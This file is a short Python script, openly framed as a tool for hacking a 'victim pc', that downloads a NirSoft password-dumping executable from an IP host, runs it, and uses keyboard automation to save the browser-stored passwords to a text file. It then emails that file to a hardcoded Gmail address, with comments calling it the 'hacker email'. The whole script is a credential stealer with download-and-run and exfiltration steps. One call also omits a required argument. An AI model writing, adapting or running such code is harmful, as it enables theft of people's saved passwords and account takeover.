import subprocess
import requests
import os,pyautogui,time,smtplib


url_to_download_from='http://192.168.201.128/nirsoft.exe'        #your direct url to download this nirsoft into victim pc

def download_file(url_to_download_from):
    
     url = url_to_download_from

     myfile = requests.get(url)

     open('nirsoft.exe', 'wb').write(myfile.content)
     
     
def change_directory_to_Downloads():
        path = os.getcwd()

        words = path.split("\\")
        print(words)
        print("\n")
        print(words[2])
        print("\n")
        os.chdir("c:\\Users\\"+words[2]+"\\Downloads")
        
  
def save_browser_pass():
    
    subprocess.Popen(['nirsoft.exe'], shell=True)
    time.sleep(0.3)
    pyautogui.hotkey("ctrl", "a")
    pyautogui.hotkey("ctrl", "s")
    pyautogui.write('nirsoft.txt')

    pyautogui.press('enter')
    
    time.sleep(0.3);
    
    pyautogui.hotkey('alt', 'f4')  
    
    
def change_directory_to_Documents():
    path = os.getcwd()

    words = path.split("\\")
    print(words)
    print("\n")
    print(words[2])

    print("\n")

    os.chdir("c:\\Users\\"+words[2]+"\\Documents")
    
    

def send_mail(app_password):
    sender_add = 'satyamgrandmaster@gmail.com'  # storing the sender's mail id
    receiver_add = 'satyamgrandmaster@gmail.com'  # storing the receiver's mail id
      # storing the password to log in
    # creating the SMTP server object by giving SMPT server address and port number
    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_server.ehlo()  # setting the ESMTP protocol
    smtp_server.starttls()  # setting up to TLS connection
    smtp_server.ehlo()  # calling the ehlo() again as encryption happens on calling startttls()
    smtp_server.login(sender_add, app_password)  # logging into out email id

    file = open('nirsoft.txt', 'r')

    # DONT FORGET TO USE .ENCODE THE STRING, ELSE IT GIVE ERROR
    msg_to_be_sent = file.read().encode()

    # sending the mail by specifying the from and to address and the message
    smtp_server.sendmail(sender_add, receiver_add, msg_to_be_sent)
    # priting a message on sending the mail
    print('Successfully the mail is sent')
    smtp_server.quit()  # terminating the server
    
    
    
    
    
change_directory_to_Downloads()     #to run nirsoft because on downloaded it goes in download folder;

download_file()

save_browser_pass()

change_directory_to_Documents()  # because nirsoft saved password is save in document folder;

send_mail(app_password = '')   # to send nirsoft password to hacker email;

#in send_mail function set your app password so that it will send all browser saved password to your gmail account
